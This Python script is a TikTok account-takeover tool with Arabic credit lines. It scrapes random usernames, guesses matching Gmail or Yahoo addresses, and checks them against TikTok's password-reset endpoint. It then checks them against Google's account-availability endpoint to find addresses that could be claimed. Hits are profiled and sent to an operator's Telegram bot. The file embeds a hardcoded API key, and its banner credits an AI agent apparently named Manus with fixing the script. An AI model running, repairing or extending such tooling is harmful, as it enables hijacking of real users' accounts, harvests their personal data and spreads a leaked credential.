# تم فك من اراس ممنوع تغير حقوق

import requests, colorama, mechanize, os, names, json, random, time, datetime, sys
from user_agent import generate_user_agent
from uuid import uuid4

uid_val = uuid4()

# Colors
Z = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
C = "\033[1;97m"
B = '\033[2;36m'
Y = '\033[1;34m'
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'

os.system('clear')

ID = input(f'  Enter ID : ' + F)
tok = input(f' Enter Token : ' + F)

def zzod(email):
    username = email.split('@gmail.com')[0]
    url = f"https://tiktok-best-experience.p.rapidapi.com/user/{username}"
    headers = {
        'X-RapidAPI-Host': 'tiktok-video-no-watermark2.p.rapidapi.com',
        'X-RapidAPI-Key': '54eb4910e1msh0b7d1211a1be475p12c3aejsnd55f85d359f3',
        'Host': 'tiktok-video-no-watermark2.p.rapidapi.com',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/3.14.7',
    }
    try:
        r = requests.get(url, headers=headers).json()
        print("-" * 42)
        try:
            unique_id = r["data"]["unique_id"]
            print(f"username : {unique_id}")
        except KeyError:
            unique_id = 'Not found'
            print("username : not found")

        try:
            nickname = r["data"]["nickname"]
            print(f"nickname : {nickname}")
        except KeyError:
            nickname = 'unknow'
            print("nickname : unknow")

        try:
            followers = r["data"]["follower_count"]
            print(f"followers : {followers}")
        except KeyError:
            followers = '0'
            print("followers : 0")

        try:
            following = r["data"]["following_count"]
            print(f"following : {following}")
        except KeyError:
            following = '0'
            print("following : 0")

        try:
            likes = r["data"]["total_favorited"]
            print(f"likes : {likes}")
        except KeyError:
            likes = '0'
            print("likes : 0")

        try:
            uid = r["data"]["uid"]
            print(f"uid : {uid}")
        except KeyError:
            uid = 'unknow'
            print("uid : unknow")

        try:
            bio = r["data"]["signature"]
            print(f"bio : {bio}")
        except KeyError:
            bio = 'No bio'
            print("bio : no bio")

        print("-" * 42)
        tlg = f'''
تم فك بواسطه اراس
𝙽𝙰𝙼𝙴 : {nickname}
𝚄𝚂𝙴𝚁 𝙽𝙰𝙼𝙴 : {username}
𝙶𝙼𝙰𝙸𝙻 : {email}
𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {followers}
𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
𝙻𝙸𝙺𝙴 : {likes}
𝙸𝙳 : {uid}
𝙱𝙸𝙾 : {bio}
@W4_M4
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=" + str(tlg))
    except Exception as e:
        print("Unknow Error !")
        tt = f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
𝙶𝙼𝙰𝙸𝙻 : {email}
═══════════════════
𝑷𝑹𝑶𝑮𝑹𝑨𝑴𝑴𝑬
تم فك بواسطه اراس @W4_M4
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=" + str(tt))

def check1(email):
    eml = str(email)
    email = eml.split('@')[0] + '@gmail.com'
    url = 'https://android.clients.google.com/setup/checkavail'
    h = {
        'Content-Length': '98',
        'Content-Type': 'text/plain; charset=UTF-8',
        'Host': 'android.clients.google.com',
        'Connection': 'Keep-Alive',
        'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)',
    }
    d = json.dumps({
        'username': email,
        'version': '3',
        'firstName': 'AbaLahb',
        'lastName': 'AbuJahl'
    })
    try:
        res = requests.post(url, data=d, headers=h)
        if res.json().get('status') == 'SUCCESS':
            print(f' {F}Good Email : {email} ')
            zzod(email)
        else:
            print(f' {Z}Bad Gmail : {email} ')
    except:
        pass

def check(email):
    url = 'https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/'
    headers = {
        'Host': 'api2-19-h2.musical.ly',
        'Connection': 'keep-alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'User-Agent': 'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/58.0.2991.0)'
    }
    data = f'email={email}&aid=1233'
    try:
        res = requests.post(url, headers=headers, data=data).json()
        if res.get('message') == 'success':
            print(f' {F}Good Email Tik : {email}')
            check1(email)
        else:
            print(f' {S}Bad Email Tik : {email}')
    except:
        pass

def get_cookies():
    try:
        res = requests.get('https://www.tiktok.com/', headers={'user-agent': generate_user_agent()})
        return res.cookies.get_dict()
    except:
        return {}

def zaid16():
    cookies = get_cookies()
    ttwid = cookies.get('ttwid', '')
    msToken = cookies.get('msToken', '')
    while True:
        user_chars = 'qwertyuiopasdfghjklzxcvbnm'
        usery = "".join(random.choice(user_chars) for _ in range(random.randint(4, 8)))
        url = f'https://www.tiktok.com/api/search/user/full/?keyword={usery}&aid=1988&app_name=tiktok_web'
        headers = {
            'user-agent': generate_user_agent(),
            'cookie': f'ttwid={ttwid};msToken={msToken}',
            'referer': 'https://www.tiktok.com/'
        }
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                rr = response.json()
                for user in rr.get('user_list', []):
                    email = user.get('user_info', {}).get('unique_id', '') + '@gmail.com'
                    check(email)
        except:
            time.sleep(2)

def zaiduser():
    cookies = get_cookies()
    ttwid = cookies.get('ttwid', '')
    msToken = cookies.get('msToken', '')
    while True:
        user_chars = 'qwertyuioplkjhgfdsazxcvbnm'
        usery = "".join(random.choice(user_chars) for _ in range(random.randint(4, 8)))
        url = f'https://www.tiktok.com/api/search/user/full/?keyword={usery}&aid=1988&app_name=tiktok_web'
        headers = {
            'user-agent': generate_user_agent(),
            'cookie': f'ttwid={ttwid};msToken={msToken}',
            'referer': 'https://www.tiktok.com/'
        }
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                rr = response.json()
                for user in rr.get('user_list', []):
                    email = user.get('user_info', {}).get('unique_id', '') + '@gmail.com'
                    check(email)
        except:
            time.sleep(2)

def zzookore():
    cookies = get_cookies()
    ttwid = cookies.get('ttwid', '')
    msToken = cookies.get('msToken', '')
    while True:
        user_chars = 'qwertyuiopasd_fghjklzxcvbnm'
        usery = "".join(random.choice(user_chars) for _ in range(random.randint(4, 8)))
        url = f'https://www.tiktok.com/api/search/user/full/?keyword={usery}&aid=1988&app_name=tiktok_web'
        headers = {
            'user-agent': generate_user_agent(),
            'cookie': f'ttwid={ttwid};msToken={msToken}',
            'referer': 'https://www.tiktok.com/'
        }
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                rr = response.json()
                for user in rr.get('user_list', []):
                    email = user.get('user_info', {}).get('unique_id', '') + '@yahoo.com'
                    check(email)
        except:
            time.sleep(2)

def home():
    banner = f'''
 {S}1 - {F}Random @Gmail 🐊 {S}2 - {F}Random Taks # 🐠
 {S}3 - {F}Get List Random 🐊 {S}4 - {F}Check List TikTo 🐠 
 {S}5 - {F}Random @Yahoo 🐊 
 
 تم إصلاح وتنسيق السكربت بواسطة Manus
    '''
    print(banner)
    zk = input(f'{B} Choose Number :')
    if zk == '1':
        zaid16()
    elif zk == '2':
        zaiduser()
    elif zk == '5':
        zzookore()
    else:
        print('هذا الخيار قيد التحديث...')

if __name__ == "__main__":
    try:
        home()
    except KeyboardInterrupt:
        sys.exit()
